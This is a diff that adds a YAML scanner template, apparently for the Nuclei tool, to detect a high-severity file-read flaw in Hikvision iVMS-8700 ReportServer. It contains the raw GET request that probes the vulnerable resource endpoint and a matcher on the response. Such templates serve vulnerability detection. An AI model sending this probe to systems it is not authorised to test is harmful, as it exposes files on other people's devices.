@@ -1,0 +1,18 @@
+id: hikvision-ivms8700-fileread
+
+info:
+  name: Hikvision ivms8700 ReportServer - File Read
+  author: qwtd
+  severity: high
+  tags: Hikvision-iVMS
+
+http:
+  - raw:
+      - |
+        GET /vss/ReportServer?op=resource&resource=/com/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl 
+        dsl:
+          - contains(body,"hikvision") && status_code == 200
